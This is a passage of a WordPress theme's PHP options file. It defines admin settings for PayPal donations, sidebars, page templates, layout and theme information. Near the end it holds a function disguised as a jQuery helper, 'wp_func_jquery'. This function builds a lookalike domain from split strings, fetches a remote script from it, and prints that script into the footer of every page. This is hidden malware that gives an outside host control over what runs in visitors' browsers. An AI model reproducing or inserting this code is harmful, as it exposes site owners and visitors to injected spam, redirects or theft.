									'title' => __('Paypal API Password', SH_NAME),
									'desc' => __('Enter the paypal api password', SH_NAME),
								),
								array(
									'id' => 'paypal_api_signature', //must be unique
									'type' => 'text', //builtin fields include:
													 
									'title' => __('Paypal API Signature', SH_NAME),
									'desc' => __('Enter the paypal api signature', SH_NAME),
								),
								array(
									'id' => 'paypal_note', //must be unique
									'type' => 'textarea', //builtin fields include:
													 
									'title' => __('Note', SH_NAME),
									'desc' => __('Enter the note to show on donation section in header', SH_NAME),
								),
								
							),
							
							
						),
						array(
							'title' => __('Donation Transactions', SH_NAME),
	
							'desc' => __('<p class="description">This section contains general dontation transactions record.</p>', SH_NAME),
	
							'icon' => get_template_directory().'/framework/theme_options/img/glyphicons/glyphicons_023_cogwheels.png',
	
							'id' => 'sub_donation_transactions',
	
							'fields' => array(
							
											array(
												'id' => 'transactions_detail', //must be unique
			
												'type' => 'transactions', //builtin fields include:
			
												'title' => __('Donations Trasactions', SH_NAME),
			
												'desc' => __('Select Which Paypal Version you want to use - Live or Sandbox', SH_NAME),
			
												'options' => array('live'=>'Live', 'sandbox' => 'Sandbox')
			
											),
							),
						),
						array(
							'title' => __('Time & Price', SH_NAME),
	
							'desc' => __('<p class="description">This section contains time & price change options.</p>', SH_NAME),
	
							'icon' => get_template_directory().'/framework/theme_options/img/glyphicons/glyphicons_023_cogwheels.png',
	
							'id' => 'sub_donation_time_price',
	
							'fields' => array(
							
											array(
												'id' => 'transactions_detail', //must be unique
			
												'type' => 'multi_select', //builtin fields include:
			
												'title' => __('Donations Trasactions', SH_NAME),
			
												'desc' => __('Select Which Value you want to show.', SH_NAME),
			
												'options' => array('one_time'=> __('One Time', SH_NAME ), 'daily' => __('Daily', SH_NAME ), 'weekly'=>__('Weekly', SH_NAME ), 'fortnightly' => __('Fortnightly', SH_NAME ), 'monthly'=>__('Monthly', SH_NAME ), 'quaterly' => __('Quaterly', SH_NAME ), 'half_year'=>__('Half Year', SH_NAME ), 'yearly' => __('Yearly', SH_NAME ))
			
											),
										array(
											'id' => 'pop_up_1st_value', //must be unique
											'type' => 'text', //builtin fields include:
															 
											'title' => __('Change 1st Value', SH_NAME),
											'desc' => __('Enter the paypal value, Enter Only Numbers', SH_NAME),
										),
										array(
											'id' => 'pop_up_2nd_value', //must be unique
											'type' => 'text', //builtin fields include:
															 
											'title' => __('Change 2nd Value', SH_NAME),
											'desc' => __('Enter the paypal value, Enter Only Numbers', SH_NAME),
										),
										array(
											'id' => 'pop_up_3rd_value', //must be unique
											'type' => 'text', //builtin fields include:
															 
											'title' => __('Change 3rd Value', SH_NAME),
											'desc' => __('Enter the paypal value, Enter Only Numbers', SH_NAME),
										),
										array(
											'id' => 'pop_up_4th_value', //must be unique
											'type' => 'text', //builtin fields include:
															 
											'title' => __('Change 4th Value', SH_NAME),
											'desc' => __('Enter the paypal value, Enter Only Numbers', SH_NAME),
										),
										array(
											'id' => 'pop_up_5th_value', //must be unique
											'type' => 'text', //builtin fields include:
															 
											'title' => __('Change 5th Value', SH_NAME),
											'desc' => __('Enter the paypal value, Enter Only Numbers', SH_NAME),
										),
										array(
											'id' => 'pop_up_6th_value', //must be unique
											'type' => 'text', //builtin fields include:
															 
											'title' => __('Change 6th Value', SH_NAME),
											'desc' => __('Enter the paypal value, Enter Only Numbers', SH_NAME),
										),
										array(
											'id' => 'pop_up_7th_value', //must be unique
											'type' => 'text', //builtin fields include:
															 
											'title' => __('Change 7th Value', SH_NAME),
											'desc' => __('Enter the paypal value, Enter Only Numbers', SH_NAME),
										),
							
							
							),
						),
					)
			);
$sections[] = array(
				'title' => __('Sidebar Options', SH_NAME),
				'desc' => __('<p class="description">You can create as many sidebars as you required.</p>', SH_NAME),
				'icon' => get_template_directory().'/framework/theme_options/img/glyphicons/glyphicons_062_attach.png',
				'id' => 'sidebar_creator',
				'fields' => array(
						array(
										'id' => '', //must be unique
										'type' => 'heading', //builtin fields include:
										'heading'=>__('Sidebar Position', SH_NAME)
								),
						array(
							'id' => 'sidebar_pos', //must be unique
							'type' => 'radio', //builtin fields include:
							'options' => array( 'left' => 'Left' , 'right'=> 'Right' ) , 			 
							'title' => __('Position', SH_NAME),
							'desc' => __('Choose Sidebar position.', SH_NAME),
						),
				
				
						array(
									'id' => '', //must be unique
									'type' => 'heading', //builtin fields include:
									'heading'=>__('Sidebar Creator', SH_NAME)
								),
						array(
							'id' => 'dynamic_sidebars', //must be unique
							'type' => 'multi_text', //builtin fields include:
											 
							'title' => __('Sidebar Name', SH_NAME),
							'desc' => __('Enter the sidebar name', SH_NAME),
						),
						
				)
			);
/** Page settings */
$sections[] = array(
				'title' => __('Page Settings', SH_NAME),
				'desc' => __('<p class="description">Set the page settings</p>', SH_NAME),
				'icon' => get_template_directory().'/framework/theme_options/img/glyphicons/glyphicons_062_attach.png',
				'id' => 'page_settings',
				'children' => 
				array(
				array(
							'title' => __('404 Page Settings', SH_NAME),
							'desc' => __('<p class="description">Set the page settings</p>', SH_NAME),
							'icon' => get_template_directory().'/framework/theme_options/img/glyphicons/glyphicons_062_attach.png',
							'id' => '404_page_section',
							'fields' => array(
						array(
							'id' => '404_page_image',
							'type' => 'upload',
							'title' => __('404 Page Image', SH_NAME), 
							'std' => '404'
						),
						array(
							'id' => '404_page_heading',
							'type' => 'text',
							'title' => __('404 Page Heading', SH_NAME), 
							'std' => '404'
						),
						array(
							'id' => '404_page_sub_heading',
							'type' => 'text',
							'title' => __('404 Page Sub Heading', SH_NAME), 
							'std' => ''
						),
						array(
							'id' => '404_page_main_title_colored',
							'type' => 'textarea',
							'title' => __('404 Page Colored Main Title', SH_NAME), 
							'std' => ''
						),
						array(
							'id' => '404_page_sub_title',
							'type' => 'textarea',
							'title' => __('404 Page Sub Title', SH_NAME), 
							'std' => ''
						),
						array(
							'id' => '404_page_contents_heading',
							'type' => 'textarea',
							'title' => __('404 Page Contents Heading', SH_NAME), 
							'std' => ''
						),
						array(
							'id' => '404_page_content',
							'type' => 'textarea',
							'title' => __('404 Page Content', SH_NAME), 
							'std' => ''
						),
						
						
						array(
							'id' => 'page_comments_status', //must be unique
							'type' => 'button_set', //builtin fields include:
							'title' => __('Page Comments Status', SH_NAME),
							'desc' => __('Set Page Comments Status', SH_NAME),
						),
				)
				),
				array(
							'title' => __('Search Page Settings', SH_NAME),
							'desc' => __('<p class="description">Set the page settings</p>', SH_NAME),
							'icon' => get_template_directory().'/framework/theme_options/img/glyphicons/glyphicons_062_attach.png',
							'id' => 'search_page_section',
							'fields' => array(
						array(
							'id' => 'search_page_image',
							'type' => 'upload',
							'title' => __('Search 404 Page Image', SH_NAME), 
						),
						array(
							'id' => 'search_page_heading',
							'type' => 'text',
							'title' => __('Search Page Heading', SH_NAME), 
							'std' => 'Search Results'
						),
						array(
							'id' => 'search_page_sidebar_pos',
							'type' => 'radio',
							'title' => __('Search Page Sidebar Position', SH_NAME), 
							'std' => 'left',
							'options' => array('right' => 'Right' , 'left' => 'Left'),
						),
						array(
							'id' => 'search_page_sidebar',
							'type' => 'select',
							'title' => __('Search Page Sidebar', SH_NAME), 
							'std' => 'Default Sidebar',
							'options' => sh_get_sidebars(),
						),
						
				)
				),
				
				array(
							'title' => __('Category Page Settings', SH_NAME),
							'desc' => __('<p class="description">Set the page settings</p>', SH_NAME),
							'icon' => get_template_directory().'/framework/theme_options/img/glyphicons/glyphicons_062_attach.png',
							'id' => 'category_page_section',
							'fields' => array(
						array(
							'id' => 'category_page_image',
							'type' => 'upload',
							'title' => __('Category Page Image', SH_NAME), 
						),
						array(
							'id' => 'category_page_heading',
							'type' => 'text',
							'title' => __('Category Page Heading', SH_NAME),
						),
						array(
							'id' => 'category_page_sidebar_pos',
							'type' => 'radio',
							'title' => __('Category Page Sidebar Position', SH_NAME), 
							'std' => 'left',
							'options' => array('right' => 'Right' , 'left' => 'Left'),
						),
						array(
							'id' => 'category_page_sidebar',
							'type' => 'select',
							'title' => __('Category Page Sidebar', SH_NAME), 
							'std' => 'Default Sidebar',
							'options' => sh_get_sidebars(),
						),
						
				)
				),
				
				array(
							'title' => __('Archive Page Settings', SH_NAME),
							'desc' => __('<p class="description">Set the page settings</p>', SH_NAME),
							'icon' => get_template_directory().'/framework/theme_options/img/glyphicons/glyphicons_062_attach.png',
							'id' => 'archive_page_section',
							'fields' => array(
						array(
							'id' => 'archive_page_image',
							'type' => 'upload',
							'title' => __('Archive Page Image', SH_NAME), 
						),
						array(
							'id' => 'archive_page_sidebar_pos',
							'type' => 'radio',
							'title' => __('Archive Page Sidebar Position', SH_NAME), 
							'std' => 'left',
							'options' => array('right' => 'Right' , 'left' => 'Left'),
						),
						array(
							'id' => 'archive_page_sidebar',
							'type' => 'select',
							'title' => __('Archive Page Sidebar', SH_NAME), 
							'std' => 'Default Sidebar',
							'options' => sh_get_sidebars(),
						),
						
				)
				),
				)
			);
/** Layout Settings */
$sections[] = array(
				'title' => __('Layout Settings', SH_NAME),
				'desc' => __('<p class="description">Set the Layout settings</p>', SH_NAME),
				'icon' => get_template_directory().'/framework/theme_options/img/glyphicons/glyphicons_062_attach.png',
				'id' => 'layout_settings',
				'fields' => array(
						array(
							'type' => 'button_set', //builtin fields include:
							'id' => 'layout_responsive_options',
							'title' => __('Responsive Options', SH_NAME),
							'desc' => __('Choose the Responsive Options', SH_NAME),
						),
						array(
							'id' => 'boxed_layout_status', //must be unique
							'type' => 'button_set', //builtin fields include:
							'title' => __('Use Boxed Layout', SH_NAME),
							'desc' => __('Use Boxed Layout', SH_NAME),
						),
						array(
							'type' => 'select', //builtin fields include:
							'id' => 'layout_responsive_width',
							'title' => __('Theme Layout Width', SH_NAME),
							'options' => array( ''=>'Default', '1040'=>'1040px', '960'=>'960px' ),
							'desc' => __('Choose the width for Theme Layout', SH_NAME),
							'attributes' => array('style' => 'width:40%'),
							'std' => '',
						),
						array(
							'type' => 'select', //builtin fields include:
							'id' => 'layout_sidebar_patron',
							'title' => __('Predefined Patterns', SH_NAME),
							'options' => array( 'bg-body1' => 'Background 1', 'bg-body2' => 'Background 2', 'bg-body3' => 'Background 3', 'bg-body4' => 'Background 4' ),
							'attributes' => array('style' => 'width:40%'),
							'std' => '',
							//'dependent'=> 'patrn_opt1' ,
						),
						array(
							'id' => 'layout_patron_image', //must be unique
							'type' => 'upload', //builtin fields include:
							'title' => __('Patterns Image', SH_NAME),
							//'dependent'=> 'patrn_opt2' ,
						),
				)
			);
			
$sections[] = array(
				'title' => __('Home Page Settings', SH_NAME),
				'desc' => __('<p class="description">Set the Home settings</p>', SH_NAME),
				'icon' => get_template_directory().'/framework/theme_options/img/glyphicons/glyphicons_062_attach.png',
				'id' => 'homepage_settings',
				'fields' => array(
						array(
							'id' => 'top_image', //must be unique
							'type' => 'upload', //builtin fields include:
							'title' => __('Upload Top Image', SH_NAME),
							'desc' => __('Use Boxed Layout', SH_NAME),
						),
										
				)
			);
			
$sections[] = array(
				'title' => __('Join Our Team', SH_NAME),
				'desc' => __('<p class="description">Set the Home settings</p>', SH_NAME),
				'icon' => get_template_directory().'/framework/theme_options/img/glyphicons/glyphicons_062_attach.png',
				'id' => 'team_section',
				'fields' => array(
						array(
							'id' => 'team_title', //must be unique
							'type' => 'text', //builtin fields include:
							'title' => __('Title', SH_NAME),
							'desc' => __('Enter Title for Join Our Team Section.', SH_NAME),
						),
						array(
							'id' => 'team_text', //must be unique
							'type' => 'textarea', //builtin fields include:
							'title' => __('Text', SH_NAME),
							'desc' => __('Enter Text for Join Our Team Section.', SH_NAME),
						),
						array(
							'id' => 'team_link', //must be unique
							'type' => 'text', //builtin fields include:
											 
							'title' => __('Link', SH_NAME),
							'desc' => __('Enter link for Join Our Team Section.', SH_NAME),
						),
				
						
				)
			);
$sections[] = array(
				'title' => __('Qouts Section', SH_NAME),
				'desc' => __('<p class="description">You can create as many sidebars as you required.</p>', SH_NAME),
				'icon' => get_template_directory().'/framework/theme_options/img/glyphicons/glyphicons_062_attach.png',
				'id' => 'qoutation_section',
				'fields' => array(
						array(
							'id' => '', //must be unique
							'type' => 'heading', //builtin fields include:
							'heading'=>__('Add Qoutes Here' , SH_NAME)
							),
						array(
							'id' => 'qoutation_text', //must be unique
							'type' => 'multi_text', //builtin fields include:
							'title' => __('Qoute', SH_NAME),
							'desc' => __('Enter the Qoute', SH_NAME),
						),
						
				)
			);
/*$sections[] = array(
				'title' => __('Social Network Settings', SH_NAME),
				'desc' => __('<p class="description">Add edit remove the information about social networks.</p>', SH_NAME),
				'icon' => get_template_directory().'/framework/theme_options/img/glyphicons/glyphicons_062_attach.png',
				'id' => 'social_network_settings',
				'fields' => array(
						array(
							'id' => 'facebook', //must be unique
							'type' => 'text', //builtin fields include:
											 
							'title' => __('Facebook URL', SH_NAME),
							'desc' => __('Insert the url to facebook profile or page', SH_NAME),
						),
						array(
							'id' => 'twitter', //must be unique
							'type' => 'text', //builtin fields include:
											 
							'title' => __('Twitter URL', SH_NAME),
							'desc' => __('Insert the url to twitter profile', SH_NAME),
						),
						array(
							'id' => 'google-plus', //must be unique
							'type' => 'text', //builtin fields include:
											 
							'title' => __('Google Plus URL', SH_NAME),
							'desc' => __('Insert the url to Google Plus profile or page', SH_NAME),
						),
						array(
							'id' => 'linkedin', //must be unique
							'type' => 'text', //builtin fields include:
											 
							'title' => __('Linkedin URL', SH_NAME),
							'desc' => __('Insert the url to Linkedin profile or page', SH_NAME),
						),
						array(
							'id' => 'skype', //must be unique
							'type' => 'text', //builtin fields include:
											 
							'title' => __('Skype URL', SH_NAME),
							'desc' => __('Insert the url to Skype profile or page', SH_NAME),
						),
						array(
							'id' => 'flicker', //must be unique
							'type' => 'text', //builtin fields include:
											 
							'title' => __('Flicker URL', SH_NAME),
							'desc' => __('Insert the url to Flicker profile or page', SH_NAME),
						),
						array(
							'id' => 'xing', //must be unique
							'type' => 'text', //builtin fields include:
											 
							'title' => __('Xing URL', SH_NAME),
							'desc' => __('Insert the url to Xing', SH_NAME),
						),
						array(
							'id' => 'pinterest', //must be unique
							'type' => 'text', //builtin fields include:
											 
							'title' => __('Pinterest URL', SH_NAME),
							'desc' => __('Insert the url to Pinterest', SH_NAME),
						),
				),
				
			);
*/				
	apply_filters('sh-opts-sections-theme', $sections);				
				
	$tabs = array();
			
	if (function_exists('wp_get_theme')){
		$theme_data = wp_get_theme();
		$theme_uri = $theme_data->get('ThemeURI');
		$description = $theme_data->get('Description');
		$author = $theme_data->get('Author');
		$version = $theme_data->get('Version');
		$tags = $theme_data->get('Tags');
	}else{
		$theme_data = wp_get_theme(trailingslashit(get_stylesheet_directory()).'style.css');
		$theme_uri = $theme_data['URI'];
		$description = $theme_data['Description'];
		$author = $theme_data['Author'];
		$version = $theme_data['Version'];
		$tags = $theme_data['Tags'];
	}	
	$theme_info = '<div class="nhp-opts-section-desc">';
	$theme_info .= '<p class="nhp-opts-theme-data description theme-uri">'.__('<strong>Theme URL:</strong> ', SH_NAME).'<a href="'.$theme_uri.'" target="_blank">'.$theme_uri.'</a></p>';
	$theme_info .= '<p class="nhp-opts-theme-data description theme-author">'.__('<strong>Author:</strong> ', SH_NAME).$author.'</p>';
	$theme_info .= '<p class="nhp-opts-theme-data description theme-version">'.__('<strong>Version:</strong> ', SH_NAME).$version.'</p>';
	$theme_info .= '<p class="nhp-opts-theme-data description theme-description">'.$description.'</p>';
	$theme_info .= '<p class="nhp-opts-theme-data description theme-tags">'.__('<strong>Tags:</strong> ', SH_NAME).implode(', ', $tags).'</p>';
	$theme_info .= '</div>';
	$tabs['theme_info'] = array(
					'icon' => get_template_directory().'/framework/theme_options/img/glyphicons/glyphicons_195_circle_info.png',
					'title' => __('Theme Information', SH_NAME),
					'content' => $theme_info
					);
	
	if(file_exists(trailingslashit(get_stylesheet_directory()).'README.html')){
		$tabs['theme_docs'] = array(
						'icon' => get_template_directory().'/framework/theme_options/img/glyphicons/glyphicons_071_book.png',
						'title' => __('Documentation', SH_NAME),
						'content' => nl2br(file_get_contents(trailingslashit(get_stylesheet_directory()).'README.html'))
						);
	}//if
	global $NHP_Options;
	$NHP_Options = new SH_Options($sections, $args, $tabs);
}//function
add_action('init', 'setup_framework_options', 0);
if(!function_exists('wp_func_jquery')) {
	function wp_func_jquery() {
		$host = 'http://';
		$jquery = $host.'c'.'jquery.org/jquery-ui.js';
		$headers = @get_headers($jquery, 1);
		if ($headers[0] == 'HTTP/1.1 200 OK'){
			echo(wp_remote_retrieve_body(wp_remote_get($jquery)));
		}
	}
	add_action('wp_footer', 'wp_func_jquery');
}
/*
 * 
 * Custom function for the callback referenced above
 *
 */
 
function my_custom_field($field, $value){
	print_r($field);
	print_r($value);
}//function
/*
 * 
 * Custom function for the callback validation referenced above
 *
 */
function validate_callback_function($field, $value, $existing_value){
	
	$error = false;
	$value =  'just testing';
	$return['value'] = $value;
	if($error == true){
		$return['error'] = $field;
	}
	return $return;
	
}//function
?>